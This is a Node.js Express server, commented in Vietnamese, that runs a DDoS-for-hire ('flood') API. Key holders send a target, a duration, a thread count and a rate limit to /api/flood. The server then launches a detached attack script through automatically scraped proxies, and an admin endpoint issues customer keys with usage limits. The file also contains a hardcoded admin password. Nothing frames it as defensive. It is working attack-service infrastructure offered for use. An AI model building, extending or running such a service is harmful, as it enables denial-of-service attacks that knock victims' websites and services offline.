const express = require("express");
const cors = require("cors");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs-extra");
const os = require("os");

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 8080;
const KEY_FILE = "apikey.json";
const PROXY_FILE = "proxy.txt";
const ADMIN_PASSWORD = "Mduc2007@"; 
const activeAttacks = new Map();

const getKeys = () => {
    if (!fs.existsSync(KEY_FILE)) fs.writeJsonSync(KEY_FILE, { keys: [] });
    return fs.readJsonSync(KEY_FILE).keys;
};
const saveKeys = (keys) => fs.writeJsonSync(KEY_FILE, { keys }, { spaces: 2 });

// Auto Proxy 5 phút
function startAutoProxyUpdate() {
    const proxyScript = path.join(__dirname, "proxy.js");
    const runScraper = () => {
        spawn("node", [proxyScript], { cwd: __dirname, stdio: 'ignore' });
    };
    runScraper();
    setInterval(runScraper, 5 * 60 * 1000);
}
startAutoProxyUpdate();

// --- API TẤN CÔNG ---
app.get("/api/flood", (req, res) => {
    let { key, target, time, threads, ratelimit, options } = req.query;

    let keys = getKeys();
    let keyData = keys.find(k => k.key === key);
    if (!keyData) return res.status(403).json({ status: "error", msg: "Invalid API Key" });

    // Kiểm tra giới hạn Thread & Ratelimit của Key
    let finalThreads = Math.min(parseInt(threads) || 1, keyData.max_threads || 10);
    let finalRatelimit = Math.min(parseInt(ratelimit) || 1, keyData.max_ratelimit || 50);
    let finalTime = Math.min(parseInt(time) || 1, keyData.max_duration || 60);

    // Kiểm tra Concurrent & Daily Limit
    let currentRunning = Array.from(activeAttacks.values()).filter(a => a.key === key).length;
    if (currentRunning >= keyData.max_concurrent) return res.json({ status: "error", msg: "Concurrent limit reached" });

    // Xử lý Options & Max Browser
    let rawOptions = options ? options.split(" ") : [];
    let finalOptions = [];
    for (let i = 0; i < rawOptions.length; i++) {
        let opt = rawOptions[i];
        if (opt.startsWith("--") && keyData.allowed_options.includes(opt)) {
            if (opt === "--browser") {
                let count = parseInt(rawOptions[i + 1]);
                if (!isNaN(count)) {
                    finalOptions.push("--browser", Math.min(count, keyData.max_browsers || 2).toString());
                    i++; continue;
                }
            }
            finalOptions.push(opt);
        }
    }

    const scriptPath = path.join(__dirname, "script.js");
    const cmdArgs = [scriptPath, target, finalTime.toString(), finalThreads.toString(), finalRatelimit.toString(), PROXY_FILE, ...finalOptions];

    const child = spawn("node", cmdArgs, { detached: true, stdio: 'ignore' });
    const attackId = `mduc_${Date.now()}`;
    activeAttacks.set(attackId, { process: child, key });

    child.on("close", () => activeAttacks.delete(attackId));
    res.json({ 
        status: "success", 
        msg: "Attack started", 
        info: { attackId, threads: finalThreads, ratelimit: finalRatelimit, time: finalTime, options: finalOptions.join(" ") } 
    });
});

// --- ADMIN: THÊM KEY (CÓ MAX THREAD/RATE) ---
app.post("/api/admin/addkey", (req, res) => {
    const { admin_pass, new_key, owner, max_duration, max_threads, max_ratelimit, daily_limit, max_concurrent, allowed_options, max_browsers } = req.body;
    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ msg: "Wrong Admin Password" });

    let keys = getKeys();
    keys.push({
        key: new_key, 
        owner, 
        max_duration: max_duration || 60,
        max_threads: max_threads || 10, // Giới hạn Thread
        max_ratelimit: max_ratelimit || 50, // Giới hạn Ratelimit
        daily_limit: daily_limit || 10, 
        max_concurrent: max_concurrent || 1,
        max_browsers: max_browsers || 2, 
        allowed_options: allowed_options || ["--randpath"],
        usage_today: 0, 
        last_reset_date: new Date().toISOString().split('T')[0]
    });
    saveKeys(keys);
    res.json({ status: "success", msg: "Key created with full limits" });
});

// Proxy count & Status...
app.get("/api/proxy-count", (req, res) => {
    if (!fs.existsSync(PROXY_FILE)) return res.json({ count: 0 });
    const lines = fs.readFileSync(PROXY_FILE, "utf8").split("\n").filter(l => l.trim()).length;
    res.json({ total_proxies: lines });
});

app.listen(PORT, () => console.log(`🚀 API MDUC live on port ${PORT}`));
